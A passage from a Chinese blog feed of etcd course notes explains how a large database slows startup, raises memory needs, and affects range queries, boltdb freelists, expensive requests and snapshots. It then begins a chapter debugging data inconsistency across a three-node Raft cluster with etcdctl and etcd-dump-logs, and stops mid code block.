命令，向一个8核32G的3节点的集群写入120万左右key。key大小为32，value大小为256到10K，用以分析大db集群案例中的各个影响面。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./benchmark</span> put <span class="hljs-params">--key-size</span> 32 <span class="hljs-params">--val-size</span> 10240 <span class="hljs-params">--total</span><br>1000000 <span class="hljs-params">--key-space-size</span> 2000000 <span class="hljs-params">--clients</span> 50 <span class="hljs-params">--conns</span> 50<br><br></code></pre></td></tr></table></figure><p>执行完一系列benchmark命令后，db size达到14G，总key数达到120万，其监控如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/67/60/67aa0c0fe078byy681fe4c55a3983f60.png?wh=1338*362" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/33/88/331ac3c759578b297546f1651385be88.png?wh=1314*412" alt="img"></p><h2 id="启动耗时"><a href="#启动耗时" class="headerlink" title="启动耗时"></a>启动耗时</h2><p>在如上的集群中，我通过benchmark工具将etcd集群db大小压测到14G后，在重新启动etcd进程的时候，如下日志所示，你会发现启动比较慢，为什么大db文件会影响etcd启动耗时呢？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">25</span>:<span class="hljs-number">55</span>.<span class="hljs-number">273712</span> I | etcdmain: etcd Version: <span class="hljs-number">3</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">26</span>:<span class="hljs-number">58</span>.<span class="hljs-number">806882</span> I | etcdserver: recovered store from snapshot at index <span class="hljs-number">2100090</span><br><span class="hljs-attribute">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">26</span>:<span class="hljs-number">58</span>.<span class="hljs-number">808810</span> I | mvcc: restore compact to <span class="hljs-number">1000002</span><br><span class="hljs-attribute">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">27</span>:<span class="hljs-number">19</span>.<span class="hljs-number">120141</span> W | etcdserver: backend quota <span class="hljs-number">26442450944</span> exceeds maximum recommended quota <span class="hljs-number">8589934592</span><br><span class="hljs-attribute">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">27</span>:<span class="hljs-number">19</span>.<span class="hljs-number">297363</span> I | embed: ready to serve client requests<br><br></code></pre></td></tr></table></figure><p>通过对etcd启动流程增加耗时统计，我们可以发现核心瓶颈主要在于打开db文件和重建内存treeIndex模块。</p><p>这里介绍下etcd启动后，重建内存treeIndex的原理。</p><p>我们知道treeIndex模块维护了用户key与boltdb key的映射关系，boltdb的key、value又包含了构建treeIndex的所需的数据。因此etcd启动的时候，会启动不同角色的goroutine并发完成treeIndex构建。</p><p><strong>首先是主goroutine。</strong> 它的职责是遍历boltdb，获取所有key-value数据，并将其反序列化成etcd的mvccpb.KeyValue结构。核心原理是基于etcd存储在boltdb中的key数据有序性，按版本号从1开始批量遍历，每次查询10000条key-value记录，直到查询数据为空。</p><p><strong>其次是构建treeIndex索引的goroutine。</strong> 它从主goroutine获取mvccpb.KeyValue数据，基于key、版本号、是否带删除标识等信息，构建keyIndex对象，插入到treeIndex模块的B-tree中。</p><p>因可能存在多个goroutine并发操作treeIndex，treeIndex的Insert函数会加全局锁，如下所示。etcd启动时只有一个 <strong>构建treeIndex索引的goroutine</strong>，因此key多时，会比较慢。之前我尝试优化成多goroutine并发构建，但是效果不佳，大量耗时会消耗在此锁上。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func (ti *treeIndex) <span class="hljs-constructor">Insert(<span class="hljs-params">ki</span> <span class="hljs-operator">*</span><span class="hljs-params">keyIndex</span>)</span> &#123;<br>   ti.<span class="hljs-constructor">Lock()</span><br>   defer ti.<span class="hljs-constructor">Unlock()</span><br>   ti.tree.<span class="hljs-constructor">ReplaceOrInsert(<span class="hljs-params">ki</span>)</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="节点内存配置"><a href="#节点内存配置" class="headerlink" title="节点内存配置"></a>节点内存配置</h2><p>etcd进程重启完成后，在没任何读写QPS情况下，如下所示，会发现etcd所消耗的内存比db大小还大一点。这又是为什么呢？如果etcd db文件大小超过节点内存规格，会导致什么问题吗？</p><p><img src="https://static001.geekbang.org/resource/image/02/a1/027ef8e1759a2800f1a2c1c105d7d7a1.png?wh=1312*394" alt="img"></p><p>etcd在启动的时候，会通过boltdb的Open API获取数据库对象，而Open API它会通过mmap机制将db文件映射到内存中。</p><p>由于etcd调用boltdb Open API的时候，设置了mmap的MAP_POPULATE flag，它会告诉Linux内核预读文件，将db文件内容全部从磁盘加载到物理内存中。</p><p>因此在你节点内存充足的情况下，启动后你看到的etcd占用内存，一般是db文件大小与内存treeIndex之和。</p><p>在节点内存充足的情况下，启动后，client后续发起对etcd的读操作，可直接通过内存获取boltdb的key-value数据，不会产生任何磁盘IO，具备良好的读性能、稳定性。</p><p>而当你的db文件大小超过节点内存配置时，若你查询的key所相关的branch page、leaf page不在内存中，那就会触发主缺页中断，导致读延时抖动、QPS下降。</p><p>因此为了保证etcd集群性能的稳定性，建议etcd节点内存规格要大于你的etcd db文件大小。</p><h2 id="treeIndex"><a href="#treeIndex" class="headerlink" title="treeIndex"></a>treeIndex</h2><p>当我们往集群中写入了一百多万key时，此时你再读取一个key范围操作的延时会出现一定程度上升，这是为什么呢？我们该如何分析耗时是在哪一步导致的？</p><p>在etcd 3.4中提供了trace特性，它可帮助我们定位、分析请求耗时过长问题。不过你需要特别注意的是，此特性在etcd 3.4中，因为依赖zap logger，默认为关闭。你可以通过设置etcd启动参数中的–logger&#x3D;zap来开启。</p><p>开启之后，我们可以在etcd日志中找到类似如下的耗时记录。</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<br><span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;trace[331581563] range&quot;</span>，<br><span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;&#123;range_begin:/vip/a; range_end:/vip/b; response_count:19304; response_revision:1005564; &#125;&quot;</span>，<br><span class="hljs-string">&quot;duration&quot;</span>:<span class="hljs-string">&quot;146.432768ms&quot;</span>，<br><span class="hljs-string">&quot;steps&quot;</span>:[<br><span class="hljs-string">&quot;trace[331581563] &#x27;</span>range keys from in-memory treeIndex<span class="hljs-string">&#x27;  (duration: 95.925033ms)&quot;</span>，<br><span class="hljs-string">&quot;trace[331581563] &#x27;</span>range keys from bolt db<span class="hljs-string">&#x27;  (duration: 47.932118ms)&quot;</span><br>]<br><br></code></pre></td></tr></table></figure><p>此日志记录了查询请求”etcdctl get –prefix &#x2F;vip&#x2F;a”。它在treeIndex中查询相关key耗时95ms，从boltdb遍历key时47ms。主要原因还是此查询涉及的key数较多，高达一万九。</p><p>也就是说若treeIndex中存储了百万级的key时，它可能也会产生几十毫秒到数百毫秒的延时，对于期望业务延时稳定在较小阈值内的业务，就无法满足其诉求。</p><h2 id="boltdb性能"><a href="#boltdb性能" class="headerlink" title="boltdb性能"></a>boltdb性能</h2><p>当db文件大小持续增长到16G乃至更大后，从etcd事务提交监控metrics你可能会观察到，boltdb在提交事务时偶尔出现了较高延时，那么延时是怎么产生的呢？</p><p>在 介绍boltdb的原理时，关于db文件的磁盘布局，它是由meta page、branch page、leaf page、free list、free页组成的。同时我给你介绍了boltdb事务提交的四个核心流程，分别是B+ tree的重平衡、分裂，持久化dirty page，持久化freelist以及持久化meta data。</p><p>事务提交延时抖动的原因主要是在B+ tree树的重平衡和分裂过程中，它需要从freelist中申请若干连续的page存储数据，或释放空闲的page到freelist。</p><p>freelist后端实现在boltdb中是array。当申请一个连续的n个page存储数据时，它会遍历boltdb中所有的空闲页，直到找到连续的n个page。因此它的时间复杂度是O(N)。若db文件较大，又存在大量的碎片空闲页，很可能导致超时。</p><p>同时事务提交过程中，也可能会释放若干个page给freelist，因此需要合并到freelist的数组中，此操作时间复杂度是O(NLog N)。</p><p>假设我们db大小16G，page size 4KB，则有400万个page。经过各种修改、压缩后，若存在一半零散分布的碎片空闲页，在最坏的场景下，etcd每次事务提交需要遍历200万个page才能找到连续的n个page，同时还需要持久化freelist到磁盘。</p><p>为了优化boltdb事务提交的性能，etcd社区在bbolt项目中，实现了基于hashmap来管理freelist。通过引入了如下的三个map数据结构（freemaps的key是连续的页数，value是以空闲页的起始页pgid集合，forwardmap和backmap用于释放的时候快速合并页），将申请和释放时间复杂度降低到了O(1)。</p><p>freelist后端实现可以通过bbolt的FreeListType参数来控制，支持array和hashmap。在etcd 3.4版本中目前还是array，未来的3.5版本将默认是hashmap。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">freemaps       <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]pidSet           <span class="hljs-comment">// key is the size of continuous pages(span)，value is a set which contains the starting pgids of same size</span><br>forwardMap     <span class="hljs-keyword">map</span>[pgid]<span class="hljs-type">uint64</span>             <span class="hljs-comment">// key is start pgid，value is its span size</span><br>backwardMap    <span class="hljs-keyword">map</span>[pgid]<span class="hljs-type">uint64</span>             <span class="hljs-comment">// key is end pgid，value is its span size</span><br><br></code></pre></td></tr></table></figure><p>另外在db中若存在大量空闲页，持久化freelist需要消耗较多的db大小，并会导致额外的事务提交延时。</p><p>若未持久化freelist，bbolt支持通过重启时扫描全部page来构造freelist，降低了db大小和提升写事务提交的性能（但是它会带来etcd启动延时的上升）。此行为可以通过bbolt的NoFreelistSync参数来控制，默认是true启用此特性。</p><h2 id="集群稳定性"><a href="#集群稳定性" class="headerlink" title="集群稳定性"></a>集群稳定性</h2><p>db文件增大后，另外一个非常大的隐患是用户client发起的expensive request，容易导致集群出现各种稳定性问题。</p><p>本质原因是etcd不支持数据分片，各个节点保存了所有key-value数据，同时它们又存储在boltdb的一个bucket里面。当你的集群含有百万级以上key的时候，任意一种expensive read请求都可能导致etcd出现OOM、丢包等情况发生。</p><p>那么有哪些expensive read请求会导致etcd不稳定性呢？</p><p><strong>首先是简单的count only查询。</strong> 如下图所示，当你想通过API统计一个集群有多少key时，如果你的key较多，则有可能导致内存突增和较大的延时。</p><p><img src="https://static001.geekbang.org/resource/image/44/a1/44ee247e9a31a455aca28459e5bb45a1.png?wh=1322*418" alt="img"></p><p>在etcd 3.5版本之前，统计key数会遍历treeIndex，把key追加到数组中。然而当数据规模较大时，追加key到数组中的操作会消耗大量内存，同时数组扩容时涉及到大量数据拷贝，会导致延时上升。</p><p><strong>其次是limit查询。</strong> 当你只想查询若干条数据的时候，若你的key较多，也会导致类似count only查询的性能、稳定性问题。</p><p>原因是etcd 3.5版本之前遍历index B-tree时，并未将limit参数下推到索引层，导致了无用的资源和时间消耗。优化方案是将limit参数下推到了索引层，实现查询性能百倍提升。</p><p><strong>最后是大包查询。</strong> 当你未分页批量遍历key-value数据或单key-value数据较大的时候，随着请求QPS增大，etcd OOM、节点出现带宽瓶颈导致丢包的风险会越来越大。</p><p>问题主要由以下两点原因导致：</p><p>第一，etcd需要遍历treeIndex获取key列表。若你未分页，一次查询万级key，显然会消耗大量内存并且高延时。</p><p>第二，获取到key列表、版本号后，etcd需要遍历boltdb，将key-value保存到查询结果数据结构中。如下trace日志所示，一个请求可能在遍历boltdb时花费很长时间，同时可能会消耗几百M甚至数G的内存。随着请求QPS增大，极易出现OOM、丢包等。etcd这块未来的优化点是实现流式传输。</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<br><span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;info&quot;</span>,<br><span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2021-02-15T03:44:52.209Z&quot;</span>,<br><span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;traceutil/trace.go:145&quot;</span>,<br><span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;trace[1908866301] range&quot;</span>,<br><span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;&#123;range_begin:; range_end:; response_count:1232274; response_revision:3128500; &#125;&quot;</span>,<br><span class="hljs-string">&quot;duration&quot;</span>:<span class="hljs-string">&quot;9.063748801s&quot;</span>,<br><span class="hljs-string">&quot;start&quot;</span>:<span class="hljs-string">&quot;2021-02-15T03:44:43.145Z&quot;</span>,<br><span class="hljs-string">&quot;end&quot;</span>:<span class="hljs-string">&quot;2021-02-15T03:44:52.209Z&quot;</span>,<br><span class="hljs-string">&quot;steps&quot;</span>:[<br><span class="hljs-string">&quot;trace[1908866301] &#x27;</span>range keys from in-memory index tree<span class="hljs-string">&#x27; (duration: 693.262565ms)&quot;</span>,<br><span class="hljs-string">&quot;trace[1908866301] &#x27;</span>range keys from bolt db<span class="hljs-string">&#x27; (duration: 8.22558566s)&quot;</span>,<br><span class="hljs-string">&quot;trace[1908866301] &#x27;</span>assemble the response<span class="hljs-string">&#x27; (duration: 18.810315ms)&quot;</span><br>]<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h2><p>大db文件最后一个影响面是快照。它会影响db备份文件生成速度、Leader发送快照给Follower节点的资源开销、Follower节点通过快照重建恢复的速度。</p><p>etcd提供了快照功能，帮助我们通过API即可备份etcd数据。当etcd收到snapshot请求的时候，它会通过boltdb接口创建一个只读事务Tx，随后通过事务的WriteTo接口，将meta page和data page拷贝到buffer即可。</p><p>但是随着db文件增大，快照事务执行的时间也会越来越长，而长事务则会导致db文件大小发生显著增加。</p><p>也就是说当db大时，生成快照不仅慢，生成快照时可能还会触发db文件大小持续增长，最终达到配额限制。</p><p>为什么长事务可能会导致db大小增长呢？</p><p>快照的另一大作用是当Follower节点异常的时候，Leader生成快照发送给Follower节点，Follower使用快照重建并追赶上Leader。此过程涉及到一定的CPU、内存、网络带宽等资源开销。</p><p>同时，若快照和集群写QPS较大，Leader发送快照给Follower和Follower应用快照到状态机的流程会耗费较长的时间，这可能会导致基于快照重建后的Follower依然无法通过正常的日志复制模式来追赶Leader，只能继续触发Leader生成快照，进而进入死循环，Follower一直处于异常中。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先大db文件首先会影响etcd启动耗时，因为etcd需要打开db文件，初始化db对象，并遍历boltdb中的所有key-value以重建内存treeIndex。</p><p>其次，较大db文件会导致etcd依赖更高配置的节点内存规格，etcd通过mmap将db文件映射到内存中。etcd启动后，正常情况下读etcd过程不涉及磁盘IO，若节点内存不够，可能会导致缺页中断，引起延时抖动、服务性能下降。</p><p>接着treeIndex维护了所有key的版本号信息，当treeIndex中含有百万级key时，在treeIndex中搜索指定范围的key的开销是不能忽略的，此开销可能高达上百毫秒。</p><p>然后当db文件过大后，boltdb本身连续空闲页的申请、释放、存储都会存在一定的开销。etcd社区已通过新的freelist管理数据结构hashmap对其进行优化，将时间复杂度降低到了O(1)，同时支持事务提交时不持久化freelist，而是通过重启时扫描page重建，以提升etcd写性能、降低db大小。</p><p>随后介绍了db文件过大后，count only、limit、大包查询等expensive request对集群稳定性的影响。建议你的业务尽量避免任何expensive request请求。</p><p>最后介绍了大db文件对快照功能的影响。大db文件意味着更长的备份时间，而更长的只读事务则可能会导致db文件增长。同时Leader发送快照与Follower基于快照重建都需要较长时间，在集群写请求较大的情况下，可能会陷入死循环，导致落后的Follower节点一直无法追赶上Leader。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12.一致性：为什么基于Raft实现的etcd还会出现数据不一致？</title>
    <link href="/2022/10/07/12-%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9F%BA%E4%BA%8ERaft%E5%AE%9E%E7%8E%B0%E7%9A%84etcd%E8%BF%98%E4%BC%9A%E5%87%BA%E7%8E%B0%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%80%E8%87%B4%EF%BC%9F/"/>
    <url>/2022/10/07/12-%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9F%BA%E4%BA%8ERaft%E5%AE%9E%E7%8E%B0%E7%9A%84etcd%E8%BF%98%E4%BC%9A%E5%87%BA%E7%8E%B0%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%80%E8%87%B4%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="12-一致性：为什么基于Raft实现的etcd还会出现数据不一致？"><a href="#12-一致性：为什么基于Raft实现的etcd还会出现数据不一致？" class="headerlink" title="12.一致性：为什么基于Raft实现的etcd还会出现数据不一致？"></a>12.一致性：为什么基于Raft实现的etcd还会出现数据不一致？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>etcd是基于Raft实现的高可用、强一致分布式存储。</p><p>问题现象：用户在更新Kubernetes集群中的Deployment资源镜像后，无法创建出新Pod，Deployment控制器莫名其妙不工作了。更令人细思极恐的是，部分Node莫名其妙消失了。</p><p>随便找了一个etcd节点查看存储数据，发现Node节点却在。这究竟是怎么一回事呢？ </p><h2 id="从消失的Node说起"><a href="#从消失的Node说起" class="headerlink" title="从消失的Node说起"></a>从消失的Node说起</h2><p>有人反馈Kubernetes集群出现了Deployment滚动更新异常、节点莫名其妙消失了等诡异现象。基于这个现象开始定位之旅。</p><p>首先查看了下Kubernetes集群APIServer、Controller Manager、Scheduler等组件状态，发现都是正常。</p><p>然后查看etcd集群各节点状态，也都是健康的，看了一个etcd节点数据也是正常，于是开始怀疑是不是APIServer出现了什么诡异的Bug了。</p><p>尝试重启APIServer，可Node依旧消失。百思不得其解的同时，只能去确认各个etcd节点上数据是否存在，结果却有了颠覆你固定思维的发现，那就是基于Raft实现的强一致存储竟然出现不一致、数据丢失。除了第一个节点含有数据，另外两个节点竟然找不到。那么问题就来了，另外两个节点数据是如何丢失的呢？</p><h2 id="一步步解密真相"><a href="#一步步解密真相" class="headerlink" title="一步步解密真相"></a>一步步解密真相</h2><p>在进一步深入分析前，结合etcd写流程原理的介绍（如下图），先大胆猜测下可能的原因。</p><p><img src="https://static001.geekbang.org/resource/image/8b/72/8b6dfa84bf8291369ea1803387906c72.png?wh=1920*1265" alt="img"></p><p>猜测1：etcd集群出现分裂，三个节点分裂成两个集群。APIServer配置的后端etcd server地址是三个节点，APIServer并不会检查各节点集群ID是否一致，因此如果分裂，有可能会出现数据“消失”现象。这种故障之前在Kubernetes社区的确也见到过相关issue，一般是变更异常导致的，显著特点是集群ID会不一致。</p><p>猜测2：Raft日志同步异常，其他两个节点会不会因为Raft模块存在特殊Bug导致未收取到相关日志条目呢？这种怀疑我们可以通过etcd自带的WAL工具来判断，它可以显示WAL日志中收到的命令（流程四、五、六）。</p><p>猜测3：如果日志同步没问题，那有没有可能是Apply模块出现了问题，导致日志条目未被应用到MVCC模块呢（流程七）？</p><p>猜测4：若Apply模块执行了相关日志条目到MVCC模块，MVCC模块的treeIndex子模块会不会出现了特殊Bug， 导致更新失败（流程八）？</p><p>猜测5：若MVCC模块的treeIndex模块无异常，写请求到了boltdb存储模块，有没有可能boltdb出现了极端异常导致丢数据呢（流程九）？</p><p>带着以上怀疑和推测，不断抽丝剥茧、去一步步探寻真相。</p><p>首先还是从故障定位第一工具“日志”开始。查看etcd节点日志没发现任何异常日志，但是当查看APIServer日志的时候，发现持续报”required revision has been compacted”，这个错误根据之前的压缩介绍，原因一般是APIServer请求etcd版本号被压缩了。</p><p>于是通过如下命令查看etcd节点详细的状态信息：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">etcdctl endpoint <span class="hljs-built_in">status</span> <span class="hljs-comment">--cluster -w json | python -m</span><br>json.tool<br><br></code></pre></td></tr></table></figure><p>获得以下结果：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<br>    &#123;<br>        <span class="hljs-string">&quot;Endpoint&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>，<br>        <span class="hljs-string">&quot;Status&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;header&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;cluster_id&quot;</span>:<span class="hljs-number">17237436991929493444</span>，<br>                <span class="hljs-string">&quot;member_id&quot;</span>:<span class="hljs-number">9372538179322589801</span>，<br>                <span class="hljs-string">&quot;raft_term&quot;</span>:<span class="hljs-number">10</span>，<br>                <span class="hljs-string">&quot;revision&quot;</span>:<span class="hljs-number">1052950</span><br>            &#125;，<br>            <span class="hljs-string">&quot;leader&quot;</span>:<span class="hljs-number">9372538179322589801</span>，<br>            <span class="hljs-string">&quot;raftAppliedIndex&quot;</span>:<span class="hljs-number">1098420</span>，<br>            <span class="hljs-string">&quot;raftIndex&quot;</span>:<span class="hljs-number">1098430</span>，<br>            <span class="hljs-string">&quot;raftTerm&quot;</span>:<span class="hljs-number">10</span>，<br>            <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;3.3.17&quot;</span><br>        &#125;<br>    &#125;，<br>    &#123;<br>        <span class="hljs-string">&quot;Endpoint&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>，<br>        <span class="hljs-string">&quot;Status&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;header&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;cluster_id&quot;</span>:<span class="hljs-number">17237436991929493444</span>，<br>                <span class="hljs-string">&quot;member_id&quot;</span>:<span class="hljs-number">10501334649042878790</span>，<br>                <span class="hljs-string">&quot;raft_term&quot;</span>:<span class="hljs-number">10</span>，<br>                <span class="hljs-string">&quot;revision&quot;</span>:<span class="hljs-number">1025860</span><br>            &#125;，<br>            <span class="hljs-string">&quot;leader&quot;</span>:<span class="hljs-number">9372538179322589801</span>，<br>            <span class="hljs-string">&quot;raftAppliedIndex&quot;</span>:<span class="hljs-number">1098418</span>，<br>            <span class="hljs-string">&quot;raftIndex&quot;</span>:<span class="hljs-number">1098428</span>，<br>            <span class="hljs-string">&quot;raftTerm&quot;</span>:<span class="hljs-number">10</span>，<br>            <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;3.3.17&quot;</span><br>        &#125;<br>    &#125;，<br>    &#123;<br>        <span class="hljs-string">&quot;Endpoint&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>，<br>        <span class="hljs-string">&quot;Status&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;header&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;cluster_id&quot;</span>:<span class="hljs-number">17237436991929493444</span>，<br>                <span class="hljs-string">&quot;member_id&quot;</span>:<span class="hljs-number">18249187646912138824</span>，<br>                <span class="hljs-string">&quot;raft_term&quot;</span>:<span class="hljs-number">10</span>，<br>                <span class="hljs-string">&quot;revision&quot;</span>:<span class="hljs-number">1028860</span><br>            &#125;，<br>            <span class="hljs-string">&quot;leader&quot;</span>:<span class="hljs-number">9372538179322589801</span>，<br>            <span class="hljs-string">&quot;raftAppliedIndex&quot;</span>:<span class="hljs-number">1098408</span>，<br>            <span class="hljs-string">&quot;raftIndex&quot;</span>:<span class="hljs-number">1098428</span>，<br>            <span class="hljs-string">&quot;raftTerm&quot;</span>:<span class="hljs-number">10</span>，<br>            <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;3.3.17&quot;</span><br>        &#125;<br>    &#125;<br>]<br><br></code></pre></td></tr></table></figure><p>从结果看，我们获得了如下信息：</p><p>第一，集群未分裂，3个节点A、B、C cluster_id都一致，集群分裂的猜测被排除。</p><p>第二，初步判断集群Raft日志条目同步正常，raftIndex表示Raft日志索引号，raftAppliedIndex表示当前状态机应用的日志索引号。这两个核心字段显示三个节点相差很小，考虑到正在写入，未偏离正常范围，Raft同步Bug导致数据丢失也大概率可以排除（不过最好还是用WAL工具验证下现在日志条目同步和写入WAL是否正常）。</p><p>第三，观察三个节点的revision值，相互之间最大差距接近30000，明显偏离标准值。关于revision的含义，它是etcd逻辑时钟，每次写入，就会全局递增。为什么三个节点之间差异如此之大呢？</p><p>接下来我们就一步步验证猜测、解密真相，猜测1集群分裂说被排除后，猜测2Raft日志同步异常也初步被我们排除了，那如何真正确认Raft日志同步正常呢？</p><p>你可以使用下面这个方法验证Raft日志条目同步是否正常。</p><p>首先我们写入一个值，比如put hello为world，然后马上在各个节点上用WAL工具etcd-dump-logs搜索hello。如下所示，各个节点上都可找到我们刚刚写入的命令。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ etcdctl put hello world<br>OK<br>$ .<span class="hljs-regexp">/bin/</span>tools<span class="hljs-regexp">/etcd-dump-logs ./</span>Node1.etcd/ | <span class="hljs-keyword">grep</span> hello<br><span class="hljs-number">10</span>         <span class="hljs-number">70</span> norm   header:&lt;ID:<span class="hljs-number">3632562852862290438</span> &gt; put:&lt;key:<span class="hljs-string">&quot;hello&quot;</span> value:<span class="hljs-string">&quot;world&quot;</span> &gt;<br>$ .<span class="hljs-regexp">/bin/</span>tools<span class="hljs-regexp">/etcd-dump-logs ./</span>Node2.etcd/ | <span class="hljs-keyword">grep</span> hello<br><span class="hljs-number">10</span>         <span class="hljs-number">70</span> norm   header:&lt;ID:<span class="hljs-number">3632562852862290438</span> &gt; put:&lt;key:<span class="hljs-string">&quot;hello&quot;</span> value:<span class="hljs-string">&quot;world&quot;</span> &gt;<br>$ .<span class="hljs-regexp">/bin/</span>tools<span class="hljs-regexp">/etcd-dump-logs ./</span>Node3.etcd/ | <span class="hljs-keyword">grep</span> hello<br><span class="hljs-number">10</span>         <span class="hljs-number">70</span> norm   header:&lt;ID:<span class="hljs-number">3632562852862290438</span> &gt; put:&lt;key:<span class="hljs-string">&quot;hello&quot;</span> value:<span class="hljs-string">&quot;world&quot;</span> &gt;<br><br></code></pre></td></tr></table></figure><p>Raft日志同步异常猜测被排除后，我们再看下会不会是Apply模块出现了问题。但是<strong>raftAppliedIndex</strong>却显示三个节点几乎无差异，那我们能不能通过这个指标来判断Apply流程是否正常呢？</p><p>源码面前了无秘密，etcd更新raftAppliedIndex核心代码如下所示，你会发现这个指标其实并不靠谱。Apply流程出现逻辑错误时，并没重试机制。etcd无论Apply流程是成功还是失败，都会更新raftAppliedIndex值。也就是一个请求在Apply或MVCC模块即便执行失败了，都依然会更新raftAppliedIndex。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 